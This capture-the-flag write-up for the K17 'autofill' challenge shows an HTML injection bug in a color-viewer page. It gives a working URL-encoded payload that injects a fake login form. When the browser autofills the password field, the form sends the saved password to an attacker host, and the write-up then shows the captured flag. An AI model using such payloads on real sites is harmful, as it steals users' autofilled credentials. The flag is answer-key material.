# autofill

```
My colleague's web browser autofills his password whenever he loads a page. Can you find his password?

autofill-web.k17.kctf.cloud
nc xss-bot-autofill.k17.kctf.cloud 1337 
```

Attachment:

```html
<!DOCTYPE html>
<html lang="en" data-theme="light">

<head>
    <meta charset="UTF-8" />
    <title>Color Viewer</title>
    <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        #colorBox {
            width: 200px;
            height: 200px;
            border-radius: 1rem;
            border: 2px solid var(--pico-muted-border-color);
            margin-top: 1rem;
        }
    </style>
</head>

<body>
    <main class="container">
        <article>
            <h1>🎨 Color Viewer</h1>
            <p id="color-name"></p>
            <div id="app"></div>
            <footer>
                <a href="login.html" role="button">Go to Login</a>
            </footer>
        </article>
    </main>

    <script>
        function getQueryParam(name) {
            const params = new URLSearchParams(window.location.search);
            return params.get(name);
        }

        const color = getQueryParam("color") || "blue";

        $("#color-name").text(`Showing color: ${color}`);
        $("#app").html(`<div id="colorBox" style="background-color: ${color}"></div>`);
    </script>
</body>

</html>
```

There is a html injection bug:

```javascript
$("#app").html(`<div id="colorBox" style="background-color: ${color}"></div>`);
```

By using the url <https://autofill-web.k17.kctf.cloud/index.html?color=%22%3E%3Cform%3E%3Clabel%3EUsername%3Cinput%20type=%22text%22%20name=%22username%22%20/%3E%3C/label%3E%3Clabel%3EPassword%3Cinput%20type=%22password%22%20name=%22password%22%20onchange=%22xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27https://REDACTED/%27%2bthis.value,%20false);xhr.send();%22%20/%3E%3C/label%3E%3C/form%3E%22>, the html becomes:

```html
<div id="colorBox" style="background-color: ">
    <form>
        <label>Username<input type="text" name="username"></label>
        <label>Password<input type="password" name="password" onchange="xhr = new XMLHttpRequest();xhr.open('GET', 'https://REDACTED/'+this.value, false);xhr.send();"></label>
    </form>
    ""&gt;
</div>
```

Send the url to the xss bot, then we can find the flag in the HTTP server's log:

```
"GET /%20K17%7Bt1me_t0_s3tup_a_prim4ry_pa55w0rd%7D HTTP/2.0" 200 1152 "https://autofill-web.k17.kctf.cloud/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
```

Flag: `K17{t1me_t0_s3tup_a_prim4ry_pa55w0rd}`.
